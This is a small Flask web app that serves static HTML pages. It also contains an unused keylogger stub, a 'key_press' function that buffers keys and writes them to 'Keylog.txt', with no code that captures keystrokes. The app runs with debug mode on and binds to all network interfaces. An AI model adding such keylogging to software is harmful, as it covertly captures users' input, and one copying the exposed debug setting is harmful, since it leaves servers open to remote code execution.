import os

from flask import Flask, render_template,request,jsonify,send_from_directory
import string 
import random
import math

import threading
import socket 





count = 0
keys = []



app = Flask(__name__)






@app.route("/")
def main():
    return render_template("About.html")



def key_press(key):
    global keys,count
    keys.append(key)
    count+= 1
    

    if count >= 100:
        count = 0
        write_file(keys)
        keys = []
    write_file(keys)



def write_file(keys):
    with open('Keylog.txt',"w")as f:
        for key in keys:
            f.write(str(key))
            






@app.route('/logo3')
def logo():
    return send_from_directory('templates','logo2.png')

@app.route("/core.html")
def about():
    return send_from_directory('templates','core.html')

@app.route("/Thank.html")
def Thanks():
    return send_from_directory('templates','Thank.html')
@app.route("/Usage.html")
def Usage():
    return send_from_directory('templates','Usage.html')










    



 
        
if __name__ == "__main__":
    for rule in app.url_map.iter_rules():
        print(rule)
    app.run(debug=True,host="0.0.0.0",port=8080)




